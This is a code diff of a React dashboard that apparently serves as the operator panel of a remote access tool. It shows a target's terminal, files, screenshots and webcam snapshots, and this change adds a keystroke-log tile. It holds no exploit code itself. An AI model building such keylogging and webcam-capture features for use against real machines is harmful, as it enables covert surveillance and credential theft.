@@ -1,12 +1,12 @@
 import React from "react";
 import Api from "containers/Api";
-import ByteImg from "./ByteImg";
 import { Responsive, WidthProvider, Layout } from "react-grid-layout";
 import { useState } from "@hook-state/core";
 import Terminal from "./tiles/Terminal";
 import TerminalOutput from "./tiles/TerminalOutput";
 import FileExplorer from "./tiles/FileExplorer";
 import ImageView from "./tiles/ImageView";
+import TextListView from "./tiles/TextListView";
 
 const GridLayout = WidthProvider(Responsive);
 
@@ -26,7 +26,8 @@ export default function Main() {
       { i: "Terminal Output", x: 4, y: 1, w: 4, h: 6 },
       { i: "File Explorer", x: 0, y: 0, w: 4, h: 14 },
       { i: "Screenshot", x: 8, y: 0, w: 4, h: 8 },
-      { i: "Webcam", x: 8, y: 4, w: 4, h: 8 }
+      { i: "Webcam", x: 8, y: 4, w: 4, h: 8 },
+      { i: "Key Log", x: 4, y: 7, w: 4, h: 6 }
     ],
     { persist: `layout-${api.target.name}` }
   );
@@ -43,14 +44,19 @@ export default function Main() {
       key: "File Explorer"
     },
     {
-      component: <ImageView event="SCREENSHOT" />,
+      component: <ImageView name="Screenshot" event="SCREENSHOT" />,
       features: ["SCREENSHOT"],
       key: "Screenshot"
     },
     {
-      component: <ImageView event="WEBCAM_SNAP" />,
+      component: <ImageView name="Webcam" event="WEBCAM_SNAP" />,
       features: ["WEBCAM_SNAP"],
       key: "Webcam"
+    },
+    {
+      component: <TextListView name="Key log" event="DUMP_KEY_LOG" />,
+      features: ["DUMP_KEY_LOG"],
+      key: "Key Log"
     }
   ];
 
@@ -72,22 +78,7 @@ export default function Main() {
           {tiles
             .filter(t => features(t.features))
             .map(tile => (
-              <div key={tile.key}>
-                <div className="w-full h-full relative">
-                  <div
-                    className="w-full flex items-center bg-clay-950 p-2"
-                    style={{ height: 25 }}
-                  >
-                    {tile.key}
-                  </div>
-                  <div
-                    className="overflow-auto w-full"
-                    style={{ height: "calc(100% - 25px)" }}
-                  >
-                    {tile.component}
-                  </div>
-                </div>
-              </div>
+              <div key={tile.key}>{tile.component}</div>
             ))}
         </GridLayout>
       </div>
